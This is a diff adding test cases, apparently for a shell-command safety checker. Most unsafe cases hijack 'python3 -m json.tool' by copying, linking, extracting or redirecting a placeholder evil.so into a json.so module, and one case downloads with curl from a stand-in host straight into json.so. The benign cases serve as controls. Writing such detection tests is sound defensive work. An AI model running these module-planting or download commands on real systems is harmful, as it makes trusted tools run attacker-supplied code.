@@ -1,0 +1,208 @@
+# CRW-894 fix round 2: the finding of the independent verifier on 5d41d266 (python3 -m json.tool imports a json module the
+# same text writes: a compiled extension, a copy tree, a redirection, or a writer the reader does not model).
+
+=== CRW-894-vr-01 | U
+--why The text copies a file to json.so, a compiled json extension module python3 -m json.tool then imports before the standard library (verifier of 5d41d266, P0).
+--file evil.so
+x
+--cmd
+cp evil.so json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-02 | U
+--why The text copies a file to json/__init__.so in a json directory with no __init__: the json package is then the compiled one of the working directory.
+--file evil.so
+x
+--file json/notes.txt
+x
+--cmd
+cp evil.so json/__init__.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-03 | U
+--why The text copies a file to a json extension module with the ABI suffix of CPython.
+--file evil.so
+x
+--cmd
+cp evil.so json.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-04 | U
+--why The text copies a file to a json extension module with the stable ABI suffix.
+--file evil.so
+x
+--cmd
+cp evil.so json.abi3.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-05 | U
+--why A redirection writes json.so before python3 -m json.tool runs.
+--file evil.so
+x
+--cmd
+cat evil.so > json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-06 | U
+--why A redirection writes the compiled __init__ of a json directory before python3 -m json.tool runs.
+--file evil.so
+x
+--file json/notes.txt
+x
+--cmd
+cat evil.so > json/__init__.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-07 | U
+--why An appending redirection creates json.so.
+--file evil.so
+x
+--cmd
+cat evil.so >> json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-08 | U
+--why tee writes json.so before python3 -m json.tool runs.
+--file evil.so
+x
+--cmd
+cat evil.so | tee json.so >/dev/null; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-09 | U
+--why A recursive copy makes json a copy of a package whose __init__ is compiled.
+--file pkg/__init__.so
+x
+--cmd
+cp -r pkg json; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-10 | U
+--why A recursive copy of a directory's contents fills the working directory with its json.so.
+--file pkg/json.so
+x
+--cmd
+cp -r pkg/. .; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-11 | U
+--why mv puts a file at json.so.
+--file evil.so
+x
+--cmd
+mv evil.so json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-12 | U
+--why install puts a file at json.so.
+--file evil.so
+x
+--cmd
+install evil.so json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-13 | U
+--why A symbolic link json.so names a compiled module the text does not show.
+--file evil.so
+x
+--cmd
+ln -s evil.so json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-14 | U
+--why A copy later in a loop body writes json.so before the second python3 -m json.tool.
+--file evil.so
+x
+--cmd
+for i in 1 2; do printf '{}' | python3 -m json.tool; cp evil.so json.so; done
+
+=== CRW-894-vr-15 | U
+--why A background python3 -m json.tool runs at the same time as the copy that writes json.so.
+--file evil.so
+x
+--cmd
+printf '{}' | python3 -m json.tool & cp evil.so json.so; wait
+
+=== CRW-894-vr-16 | U
+--why A redirection through a symbolic link to the working directory writes its json.so.
+--file evil.so
+x
+--link sub .
+--cmd
+cat evil.so > sub/json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-17 | U
+--why tar extracts files the text does not name, json.so among them perhaps.
+--file evil.tar
+x
+--cmd
+tar xf evil.tar; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-18 | U
+--why unzip extracts files the text does not name.
+--file evil.zip
+x
+--cmd
+unzip -o evil.zip; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-19 | U
+--why A python program copies a file to json.so: the reader does not model the files a program writes.
+--file evil.so
+x
+--cmd
+python3 -c "import shutil; shutil.copy('evil.so', 'json.so')"; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-20 | U
+--why curl writes its download to json.so.
+curl -so json.so https://example.invalid/x; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-21 | U
+--why dd writes json.so.
+--file evil.so
+x
+--cmd
+dd if=evil.so of=json.so; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-22 | U
+--why The copy destination is a word the reader cannot evaluate.
+--file evil.so
+x
+--cmd
+cp evil.so "$N"; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-23 | U
+--why A shell string writes json.so before python3 -m json.tool runs.
+--file evil.so
+x
+--cmd
+bash -c 'cp evil.so json.so'; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-24 | U
+--why A background redirection writes json.so while python3 -m json.tool starts.
+--file evil.so
+x
+--cmd
+cat evil.so > json.so & printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-25 | U
+--why A redirection with a target the reader cannot evaluate may write json.so.
+--file evil.so
+x
+--cmd
+cat evil.so > "$N"; printf '{}' | python3 -m json.tool
+
+=== CRW-894-vr-26 | B
+--why Control: the pipeline of the benign corpus, grep, tail and head around python3 -m json.tool, writes no file.
+--file alerts.jsonl
+{"pr": 737}
+--cmd
+grep '"pr": *737' alerts.jsonl | tail -1 | python3 -m json.tool | head -80
+
+=== CRW-894-vr-27 | B
+--why Control: output to a file whose name is no module.
+--file in.json
+{}
+--cmd
+cat in.json | python3 -m json.tool > out.json
+
+=== CRW-894-vr-28 | B
+--why Control: descriptor duplication writes no file.
+echo '{}' | python3 -m json.tool 2>&1 | head -5
+
+=== CRW-894-vr-29 | B
+--why Control: a redirection to a file that is no json module, before python3 -m json.tool.
+echo '{}' > in.json; python3 -m json.tool < in.json
+
+=== CRW-894-vr-30 | B
+--why Control: python3 -m json.tool in a subdirectory the text enters.
+--file sub/x.txt
+x
+--cmd
+cd sub && printf '{}' | python3 -m json.tool
